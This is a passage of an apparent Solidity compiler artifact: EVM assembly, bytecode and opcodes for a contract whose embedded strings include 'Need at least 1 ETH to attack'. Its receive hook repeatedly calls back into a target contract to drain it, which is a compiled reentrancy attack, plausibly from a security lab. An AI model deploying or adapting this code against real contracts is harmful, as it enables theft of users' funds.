\"#utility.yul\":193:270   */\n    tag_89:\n        /* \"#utility.yul\":230:237   */\n      0x00\n        /* \"#utility.yul\":259:264   */\n      dup2\n        /* \"#utility.yul\":248:264   */\n      swap1\n      pop\n        /* \"#utility.yul\":193:270   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":276:509   */\n    tag_15:\n        /* \"#utility.yul\":315:318   */\n      0x00\n        /* \"#utility.yul\":338:362   */\n      tag_112\n        /* \"#utility.yul\":356:361   */\n      dup3\n        /* \"#utility.yul\":338:362   */\n      tag_89\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":329:362   */\n      swap2\n      pop\n        /* \"#utility.yul\":384:450   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":377:382   */\n      dup3\n        /* \"#utility.yul\":374:451   */\n      sub\n        /* \"#utility.yul\":371:474   */\n      tag_113\n      jumpi\n        /* \"#utility.yul\":454:472   */\n      tag_114\n      tag_88\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":371:474   */\n    tag_113:\n        /* \"#utility.yul\":501:502   */\n      0x01\n        /* \"#utility.yul\":494:499   */\n      dup3\n        /* \"#utility.yul\":490:503   */\n      add\n        /* \"#utility.yul\":483:503   */\n      swap1\n      pop\n        /* \"#utility.yul\":276:509   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":515:633   */\n    tag_90:\n        /* \"#utility.yul\":602:626   */\n      tag_116\n        /* \"#utility.yul\":620:625   */\n      dup2\n        /* \"#utility.yul\":602:626   */\n      tag_89\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":597:600   */\n      dup3\n        /* \"#utility.yul\":590:627   */\n      mstore\n        /* \"#utility.yul\":515:633   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":639:861   */\n    tag_30:\n        /* \"#utility.yul\":732:736   */\n      0x00\n        /* \"#utility.yul\":770:772   */\n      0x20\n        /* \"#utility.yul\":759:768   */\n      dup3\n        /* \"#utility.yul\":755:773   */\n      add\n        /* \"#utility.yul\":747:773   */\n      swap1\n      pop\n        /* \"#utility.yul\":783:854   */\n      tag_118\n        /* \"#utility.yul\":851:852   */\n      0x00\n        /* \"#utility.yul\":840:849   */\n      dup4\n        /* \"#utility.yul\":836:853   */\n      add\n        /* \"#utility.yul\":827:833   */\n      dup5\n        /* \"#utility.yul\":783:854   */\n      tag_90\n      jump\t// in\n    tag_118:\n        /* \"#utility.yul\":639:861   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":867:993   */\n    tag_91:\n        /* \"#utility.yul\":904:911   */\n      0x00\n        /* \"#utility.yul\":944:986   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":937:942   */\n      dup3\n        /* \"#utility.yul\":933:987   */\n      and\n        /* \"#utility.yul\":922:987   */\n      swap1\n      pop\n        /* \"#utility.yul\":867:993   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":999:1059   */\n    tag_92:\n        /* \"#utility.yul\":1027:1030   */\n      0x00\n        /* \"#utility.yul\":1048:1053   */\n      dup2\n        /* \"#utility.yul\":1041:1053   */\n      swap1\n      pop\n        /* \"#utility.yul\":999:1059   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1065:1207   */\n    tag_93:\n        /* \"#utility.yul\":1115:1124   */\n      0x00\n        /* \"#utility.yul\":1148:1201   */\n      tag_122\n        /* \"#utility.yul\":1166:1200   */\n      tag_123\n        /* \"#utility.yul\":1175:1199   */\n      tag_124\n        /* \"#utility.yul\":1193:1198   */\n      dup5\n        /* \"#utility.yul\":1175:1199   */\n      tag_91\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":1166:1200   */\n      tag_92\n      jump\t// in\n    tag_123:\n        /* \"#utility.yul\":1148:1201   */\n      tag_91\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":1135:1201   */\n      swap1\n      pop\n        /* \"#utility.yul\":1065:1207   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1213:1339   */\n    tag_94:\n        /* \"#utility.yul\":1263:1272   */\n      0x00\n        /* \"#utility.yul\":1296:1333   */\n      tag_126\n        /* \"#utility.yul\":1327:1332   */\n      dup3\n        /* \"#utility.yul\":1296:1333   */\n      tag_93\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":1283:1333   */\n      swap1\n      pop\n        /* \"#utility.yul\":1213:1339   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1345:1484   */\n    tag_95:\n        /* \"#utility.yul\":1408:1417   */\n      0x00\n        /* \"#utility.yul\":1441:1478   */\n      tag_128\n        /* \"#utility.yul\":1472:1477   */\n      dup3\n        /* \"#utility.yul\":1441:1478   */\n      tag_94\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":1428:1478   */\n      swap1\n      pop\n        /* \"#utility.yul\":1345:1484   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1490:1647   */\n    tag_96:\n        /* \"#utility.yul\":1590:1640   */\n      tag_130\n        /* \"#utility.yul\":1634:1639   */\n      dup2\n        /* \"#utility.yul\":1590:1640   */\n      tag_95\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":1585:1588   */\n      dup3\n        /* \"#utility.yul\":1578:1641   */\n      mstore\n        /* \"#utility.yul\":1490:1647   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1653:1901   */\n    tag_35:\n        /* \"#utility.yul\":1759:1763   */\n      0x00\n        /* \"#utility.yul\":1797:1799   */\n      0x20\n        /* \"#utility.yul\":1786:1795   */\n      dup3\n        /* \"#utility.yul\":1782:1800   */\n      add\n        /* \"#utility.yul\":1774:1800   */\n      swap1\n      pop\n        /* \"#utility.yul\":1810:1894   */\n      tag_132\n        /* \"#utility.yul\":1891:1892   */\n      0x00\n        /* \"#utility.yul\":1880:1889   */\n      dup4\n        /* \"#utility.yul\":1876:1893   */\n      add\n        /* \"#utility.yul\":1867:1873   */\n      dup5\n        /* \"#utility.yul\":1810:1894   */\n      tag_96\n      jump\t// in\n    tag_132:\n        /* \"#utility.yul\":1653:1901   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1907:1997   */\n    tag_97:\n        /* \"#utility.yul\":1941:1948   */\n      0x00\n        /* \"#utility.yul\":1984:1989   */\n      dup2\n        /* \"#utility.yul\":1977:1990   */\n      iszero\n        /* \"#utility.yul\":1970:1991   */\n      iszero\n        /* \"#utility.yul\":1959:1991   */\n      swap1\n      pop\n        /* \"#utility.yul\":1907:1997   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2003:2112   */\n    tag_98:\n        /* \"#utility.yul\":2084:2105   */\n      tag_135\n        /* \"#utility.yul\":2099:2104   */\n      dup2\n        /* \"#utility.yul\":2084:2105   */\n      tag_97\n      jump\t// in\n    tag_135:\n        /* \"#utility.yul\":2079:2082   */\n      dup3\n        /* \"#utility.yul\":2072:2106   */\n      mstore\n        /* \"#utility.yul\":2003:2112   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2118:2328   */\n    tag_48:\n        /* \"#utility.yul\":2205:2209   */\n      0x00\n        /* \"#utility.yul\":2243:2245   */\n      0x20\n        /* \"#utility.yul\":2232:2241   */\n      dup3\n        /* \"#utility.yul\":2228:2246   */\n      add\n        /* \"#utility.yul\":2220:2246   */\n      swap1\n      pop\n        /* \"#utility.yul\":2256:2321   */\n      tag_137\n        /* \"#utility.yul\":2318:2319   */\n      0x00\n        /* \"#utility.yul\":2307:2316   */\n      dup4\n        /* \"#utility.yul\":2303:2320   */\n      add\n        /* \"#utility.yul\":2294:2300   */\n      dup5\n        /* \"#utility.yul\":2256:2321   */\n      tag_98\n      jump\t// in\n    tag_137:\n        /* \"#utility.yul\":2118:2328   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2334:2430   */\n    tag_99:\n        /* \"#utility.yul\":2371:2378   */\n      0x00\n        /* \"#utility.yul\":2400:2424   */\n      tag_139\n        /* \"#utility.yul\":2418:2423   */\n      dup3\n        /* \"#utility.yul\":2400:2424   */\n      tag_91\n      jump\t// in\n    tag_139:\n        /* \"#utility.yul\":2389:2424   */\n      swap1\n      pop\n        /* \"#utility.yul\":2334:2430   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2436:2554   */\n    tag_100:\n        /* \"#utility.yul\":2523:2547   */\n      tag_141\n        /* \"#utility.yul\":2541:2546   */\n      dup2\n        /* \"#utility.yul\":2523:2547   */\n      tag_99\n      jump\t// in\n    tag_141:\n        /* \"#utility.yul\":2518:2521   */\n      dup3\n        /* \"#utility.yul\":2511:2548   */\n      mstore\n        /* \"#utility.yul\":2436:2554   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2560:2782   */\n    tag_53:\n        /* \"#utility.yul\":2653:2657   */\n      0x00\n        /* \"#utility.yul\":2691:2693   */\n      0x20\n        /* \"#utility.yul\":2680:2689   */\n      dup3\n        /* \"#utility.yul\":2676:2694   */\n      add\n        /* \"#utility.yul\":2668:2694   */\n      swap1\n      pop\n        /* \"#utility.yul\":2704:2775   */\n      tag_143\n        /* \"#utility.yul\":2772:2773   */\n      0x00\n        /* \"#utility.yul\":2761:2770   */\n      dup4\n        /* \"#utility.yul\":2757:2774   */\n      add\n        /* \"#utility.yul\":2748:2754   */\n      dup5\n        /* \"#utility.yul\":2704:2775   */\n      tag_100\n      jump\t// in\n    tag_143:\n        /* \"#utility.yul\":2560:2782   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2788:2957   */\n    tag_101:\n        /* \"#utility.yul\":2872:2883   */\n      0x00\n        /* \"#utility.yul\":2906:2912   */\n      dup3\n        /* \"#utility.yul\":2901:2904   */\n      dup3\n        /* \"#utility.yul\":2894:2913   */\n      mstore\n        /* \"#utility.yul\":2946:2950   */\n      0x20\n        /* \"#utility.yul\":2941:2944   */\n      dup3\n        /* \"#utility.yul\":2937:2951   */\n      add\n        /* \"#utility.yul\":2922:2951   */\n      swap1\n      pop\n        /* \"#utility.yul\":2788:2957   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2963:3123   */\n    tag_102:\n        /* \"#utility.yul\":3103:3115   */\n      0x4f6e6c79206f776e657200000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3099:3100   */\n      0x00\n        /* \"#utility.yul\":3091:3097   */\n      dup3\n        /* \"#utility.yul\":3087:3101   */\n      add\n        /* \"#utility.yul\":3080:3116   */\n      mstore\n        /* \"#utility.yul\":2963:3123   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3129:3495   */\n    tag_103:\n        /* \"#utility.yul\":3271:3274   */\n      0x00\n        /* \"#utility.yul\":3292:3359   */\n      tag_147\n        /* \"#utility.yul\":3356:3358   */\n      0x0a\n        /* \"#utility.yul\":3351:3354   */\n      dup4\n        /* \"#utility.yul\":3292:3359   */\n      tag_101\n      jump\t// in\n    tag_147:\n        /* \"#utility.yul\":3285:3359   */\n      swap2\n      pop\n        /* \"#utility.yul\":3368:3461   */\n      tag_148\n        /* \"#utility.yul\":3457:3460   */\n      dup3\n        /* \"#utility.yul\":3368:3461   */\n      tag_102\n      jump\t// in\n    tag_148:\n        /* \"#utility.yul\":3486:3488   */\n      0x20\n        /* \"#utility.yul\":3481:3484   */\n      dup3\n        /* \"#utility.yul\":3477:3489   */\n      add\n        /* \"#utility.yul\":3470:3489   */\n      swap1\n      pop\n        /* \"#utility.yul\":3129:3495   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3501:3920   */\n    tag_61:\n        /* \"#utility.yul\":3667:3671   */\n      0x00\n        /* \"#utility.yul\":3705:3707   */\n      0x20\n        /* \"#utility.yul\":3694:3703   */\n      dup3\n        /* \"#utility.yul\":3690:3708   */\n      add\n        /* \"#utility.yul\":3682:3708   */\n      swap1\n      pop\n        /* \"#utility.yul\":3754:3763   */\n      dup2\n        /* \"#utility.yul\":3748:3752   */\n      dup2\n        /* \"#utility.yul\":3744:3764   */\n      sub\n        /* \"#utility.yul\":3740:3741   */\n      0x00\n        /* \"#utility.yul\":3729:3738   */\n      dup4\n        /* \"#utility.yul\":3725:3742   */\n      add\n        /* \"#utility.yul\":3718:3765   */\n      mstore\n        /* \"#utility.yul\":3782:3913   */\n      tag_150\n        /* \"#utility.yul\":3908:3912   */\n      dup2\n        /* \"#utility.yul\":3782:3913   */\n      tag_103\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":3774:3913   */\n      swap1\n      pop\n        /* \"#utility.yul\":3501:3920   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3926:4095   */\n    tag_104:\n        /* \"#utility.yul\":4066:4087   */\n      0x4e656564206174206c6561737420312045544800000000000000000000000000\n        /* \"#utility.yul\":4062:4063   */\n      0x00\n        /* \"#utility.yul\":4054:4060   */\n      dup3\n        /* \"#utility.yul\":4050:4064   */\n      add\n        /* \"#utility.yul\":4043:4088   */\n      mstore\n        /* \"#utility.yul\":3926:4095   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4101:4467   */\n    tag_105:\n        /* \"#utility.yul\":4243:4246   */\n      0x00\n        /* \"#utility.yul\":4264:4331   */\n      tag_153\n        /* \"#utility.yul\":4328:4330   */\n      0x13\n        /* \"#utility.yul\":4323:4326   */\n      dup4\n        /* \"#utility.yul\":4264:4331   */\n      tag_101\n      jump\t// in\n    tag_153:\n        /* \"#utility.yul\":4257:4331   */\n      swap2\n      pop\n        /* \"#utility.yul\":4340:4433   */\n      tag_154\n        /* \"#utility.yul\":4429:4432   */\n      dup3\n        /* \"#utility.yul\":4340:4433   */\n      tag_104\n      jump\t// in\n    tag_154:\n        /* \"#utility.yul\":4458:4460   */\n      0x20\n        /* \"#utility.yul\":4453:4456   */\n      dup3\n        /* \"#utility.yul\":4449:4461   */\n      add\n        /* \"#utility.yul\":4442:4461   */\n      swap1\n      pop\n        /* \"#utility.yul\":4101:4467   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4473:4892   */\n    tag_64:\n        /* \"#utility.yul\":4639:4643   */\n      0x00\n        /* \"#utility.yul\":4677:4679   */\n      0x20\n        /* \"#utility.yul\":4666:4675   */\n      dup3\n        /* \"#utility.yul\":4662:4680   */\n      add\n        /* \"#utility.yul\":4654:4680   */\n      swap1\n      pop\n        /* \"#utility.yul\":4726:4735   */\n      dup2\n        /* \"#utility.yul\":4720:4724   */\n      dup2\n        /* \"#utility.yul\":4716:4736   */\n      sub\n        /* \"#utility.yul\":4712:4713   */\n      0x00\n        /* \"#utility.yul\":4701:4710   */\n      dup4\n        /* \"#utility.yul\":4697:4714   */\n      add\n        /* \"#utility.yul\":4690:4737   */\n      mstore\n        /* \"#utility.yul\":4754:4885   */\n      tag_156\n        /* \"#utility.yul\":4880:4884   */\n      dup2\n        /* \"#utility.yul\":4754:4885   */\n      tag_105\n      jump\t// in\n    tag_156:\n        /* \"#utility.yul\":4746:4885   */\n      swap1\n      pop\n        /* \"#utility.yul\":4473:4892   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4898:5077   */\n    tag_106:\n        /* \"#utility.yul\":5038:5069   */\n      0x4e656564206174206c6561737420312045544820746f2061747461636b000000\n        /* \"#utility.yul\":5034:5035   */\n      0x00\n        /* \"#utility.yul\":5026:5032   */\n      dup3\n        /* \"#utility.yul\":5022:5036   */\n      add\n        /* \"#utility.yul\":5015:5070   */\n      mstore\n        /* \"#utility.yul\":4898:5077   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5083:5449   */\n    tag_107:\n        /* \"#utility.yul\":5225:5228   */\n      0x00\n        /* \"#utility.yul\":5246:5313   */\n      tag_159\n        /* \"#utility.yul\":5310:5312   */\n      0x1d\n        /* \"#utility.yul\":5305:5308   */\n      dup4\n        /* \"#utility.yul\":5246:5313   */\n      tag_101\n      jump\t// in\n    tag_159:\n        /* \"#utility.yul\":5239:5313   */\n      swap2\n      pop\n        /* \"#utility.yul\":5322:5415   */\n      tag_160\n        /* \"#utility.yul\":5411:5414   */\n      dup3\n        /* \"#utility.yul\":5322:5415   */\n      tag_106\n      jump\t// in\n    tag_160:\n        /* \"#utility.yul\":5440:5442   */\n      0x20\n        /* \"#utility.yul\":5435:5438   */\n      dup3\n        /* \"#utility.yul\":5431:5443   */\n      add\n        /* \"#utility.yul\":5424:5443   */\n      swap1\n      pop\n        /* \"#utility.yul\":5083:5449   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5455:5874   */\n    tag_76:\n        /* \"#utility.yul\":5621:5625   */\n      0x00\n        /* \"#utility.yul\":5659:5661   */\n      0x20\n        /* \"#utility.yul\":5648:5657   */\n      dup3\n        /* \"#utility.yul\":5644:5662   */\n      add\n        /* \"#utility.yul\":5636:5662   */\n      swap1\n      pop\n        /* \"#utility.yul\":5708:5717   */\n      dup2\n        /* \"#utility.yul\":5702:5706   */\n      dup2\n        /* \"#utility.yul\":5698:5718   */\n      sub\n        /* \"#utility.yul\":5694:5695   */\n      0x00\n        /* \"#utility.yul\":5683:5692   */\n      dup4\n        /* \"#utility.yul\":5679:5696   */\n      add\n        /* \"#utility.yul\":5672:5719   */\n      mstore\n        /* \"#utility.yul\":5736:5867   */\n      tag_162\n        /* \"#utility.yul\":5862:5866   */\n      dup2\n        /* \"#utility.yul\":5736:5867   */\n      tag_107\n      jump\t// in\n    tag_162:\n        /* \"#utility.yul\":5728:5867   */\n      swap1\n      pop\n        /* \"#utility.yul\":5455:5874   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220b61efd5fa320b106379cf42ad13f21cb819b92ce66fd3cca0fc73d0d63174d6164736f6c63430008180033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b50604051610cc3380380610cc383398181016040528101906100319190610114565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013f565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e3826100ba565b9050919050565b6100f3816100d9565b81146100fd575f80fd5b50565b5f8151905061010e816100ea565b92915050565b5f60208284031215610129576101286100b6565b5b5f61013684828501610100565b91505092915050565b610b778061014c5f395ff3fe60806040526004361061007e575f3560e01c806367a3fde81161004d57806367a3fde81461029f57806371cb791a146102a95780638da5cb5b146102d3578063cff53a4a146102fd57610213565b806312065fe0146102175780631f92db4514610241578063407c28211461026b578063494eba641461029557610213565b366102135760025f8154809291906100959061088b565b919050555060035f9054906101000a900460ff161580156100f45750670de0b6b3a76400005f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110155b801561010257506005600254105b15610182575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663710957cc6040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561016b575f80fd5b505af115801561017d573d5f803e3d5ffd5b505050505b60035f9054906101000a900460ff1615610211575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16637fd426176040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101fa575f80fd5b505af115801561020c573d5f803e3d5ffd5b505050505b005b5f80fd5b348015610222575f80fd5b5061022b610313565b60405161023891906108e1565b60405180910390f35b34801561024c575f80fd5b5061025561031a565b6040516102629190610974565b60405180910390f35b348015610276575f80fd5b5061027f61033d565b60405161028c91906108e1565b60405180910390f35b61029d610343565b005b6102a7610536565b005b3480156102b4575f80fd5b506102bd610728565b6040516102ca91906109a7565b60405180910390f35b3480156102de575f80fd5b506102e761073a565b6040516102f491906109e0565b60405180910390f35b348015610308575f80fd5b5061031161075f565b005b5f47905090565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103d2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103c990610a53565b60405180910390fd5b670de0b6b3a764000034101561041d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161041490610abb565b60405180910390fd5b600160035f6101000a81548160ff0219169083151502179055505f6002819055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156104a3575f80fd5b505af11580156104b5573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16637fd426176040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561051e575f80fd5b505af1158015610530573d5f803e3d5ffd5b50505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146105c5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105bc90610a53565b60405180910390fd5b670de0b6b3a7640000341015610610576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161060790610b23565b60405180910390fd5b5f60035f6101000a81548160ff0219169083151502179055505f6002819055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610695575f80fd5b505af11580156106a7573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663710957cc6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610710575f80fd5b505af1158015610722573d5f803e3d5ffd5b50505050565b60035f9054906101000a900460ff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146107ee576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107e590610a53565b60405180910390fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f19350505050158015610852573d5f803e3d5ffd5b50565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f61089582610882565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036108c7576108c6610855565b5b600182019050919050565b6108db81610882565b82525050565b5f6020820190506108f45f8301846108d2565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61093c610937610932846108fa565b610919565b6108fa565b9050919050565b5f61094d82610922565b9050919050565b5f61095e82610943565b9050919050565b61096e81610954565b82525050565b5f6020820190506109875f830184610965565b92915050565b5f8115159050919050565b6109a18161098d565b82525050565b5f6020820190506109ba5f830184610998565b92915050565b5f6109ca826108fa565b9050919050565b6109da816109c0565b82525050565b5f6020820190506109f35f8301846109d1565b92915050565b5f82825260208201905092915050565b7f4f6e6c79206f776e6572000000000000000000000000000000000000000000005f82015250565b5f610a3d600a836109f9565b9150610a4882610a09565b602082019050919050565b5f6020820190508181035f830152610a6a81610a31565b9050919050565b7f4e656564206174206c65617374203120455448000000000000000000000000005f82015250565b5f610aa56013836109f9565b9150610ab082610a71565b602082019050919050565b5f6020820190508181035f830152610ad281610a99565b9050919050565b7f4e656564206174206c6561737420312045544820746f2061747461636b0000005f82015250565b5f610b0d601d836109f9565b9150610b1882610ad9565b602082019050919050565b5f6020820190508181035f830152610b3a81610b01565b905091905056fea2646970667358221220b61efd5fa320b106379cf42ad13f21cb819b92ce66fd3cca0fc73d0d63174d6164736f6c63430008180033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xCC3 CODESIZE SUB DUP1 PUSH2 0xCC3 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x114 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x13F JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE3 DUP3 PUSH2 0xBA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF3 DUP2 PUSH2 0xD9 JUMP JUMPDEST DUP2 EQ PUSH2 0xFD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x10E DUP2 PUSH2 0xEA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x129 JUMPI PUSH2 0x128 PUSH2 0xB6 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x136 DUP5 DUP3 DUP6 ADD PUSH2 0x100 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xB77 DUP1 PUSH2 0x14C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x7E JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x67A3FDE8 GT PUSH2 0x4D JUMPI DUP1 PUSH4 0x67A3FDE8 EQ PUSH2 0x29F JUMPI DUP1 PUSH4 0x71CB791A EQ PUSH2 0x2A9 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x2D3 JUMPI DUP1 PUSH4 0xCFF53A4A EQ PUSH2 0x2FD JUMPI PUSH2 0x213 JUMP JUMPDEST DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x217 JUMPI DUP1 PUSH4 0x1F92DB45 EQ PUSH2 0x241 JUMPI DUP1 PUSH4 0x407C2821 EQ PUSH2 0x26B JUMPI DUP1 PUSH4 0x494EBA64 EQ PUSH2 0x295 JUMPI PUSH2 0x213 JUMP JUMPDEST CALLDATASIZE PUSH2 0x213 JUMPI PUSH1 0x2 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x95 SWAP1 PUSH2 0x88B JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x3 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO DUP1 ISZERO PUSH2 0xF4 JUMPI POP PUSH8 0xDE0B6B3A7640000 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x102 JUMPI POP PUSH1 0x5 PUSH1 0x2 SLOAD LT JUMPDEST ISZERO PUSH2 0x182 JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x710957CC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x16B JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x17D JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x3 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 